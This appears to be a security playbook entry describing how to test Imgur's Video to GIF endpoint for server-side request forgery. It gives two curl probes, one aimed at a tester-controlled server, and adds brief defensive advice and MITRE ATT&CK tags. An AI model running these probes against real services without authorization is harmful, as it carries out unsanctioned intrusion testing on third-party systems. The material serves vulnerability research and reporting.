---
id: proc-imgur-ssrf-identify-001
tags:
  - ssrf
  - recon
  - web
type: procedure
tools:
  - '[[tools/Apache-Web-Server]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-basic-probe]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:28:20.691Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Identify-SSRF-Vulnerable-Endpoint-in-Imgur-VidGIF

## Summary

This procedure involves probing Imgur's Video to GIF endpoint to identify the lack of validation on the 'url' GET parameter, allowing arbitrary server-side requests.

## Description

In the context of Imgur's /vidgif/url endpoint, the procedure tests for SSRF by submitting external URLs and observing server behavior. This targets web applications built on Ruby where input sanitization is insufficient, potentially exposing internal networks or enabling proxying attacks.

## Requirements

1. Access to Imgur's public endpoint over HTTPS
2. Basic knowledge of HTTP requests and parameters
3. curl or similar HTTP client

## Defense

Defensive measures and detection strategies:

- Implement URL whitelisting or blacklisting for server-side fetches
- Use network segmentation to isolate internal resources
- Monitor outbound traffic from application servers for anomalies

## Objectives

1. Confirm the endpoint processes arbitrary URLs server-side
2. Identify potential for internal or external request forgery
3. Gather evidence for vulnerability reporting

## Instructions

### Step 1: Probe the Endpoint with Basic External URL

**Context**: Send a simple GET request to test if the 'url' parameter triggers a server-side fetch without validation.

**Command** ([[commands/curl-basic-probe]]):
```bash
curl -X GET "https://i.imgur.com/vidgif/url?url=https://example.com/test.txt" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
```

> This command sends a request to the endpoint with a benign external URL. Expected output is a server response (e.g., 200 OK or processing message) without errors, indicating no validation.

### Step 2: Test with Attacker-Controlled URL

**Context**: Replace with a URL pointing to your test server to observe if Imgur fetches it.

**Command** ([[commands/curl-basic-probe]]):
```bash
curl -X GET "https://i.imgur.com/vidgif/url?url=https://yourserver.com/.testing/test.txt" \
  -H "Accept: */*" \
  -H "Referer: http://imgur.com/vidgif"
```

> Monitor your server for incoming requests. Success is confirmed by log entries from Imgur IPs.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-basic-probe]]

## Tools Used

- [[tools/Apache-Web-Server]]

## Tags

- ssrf
- web
- ruby
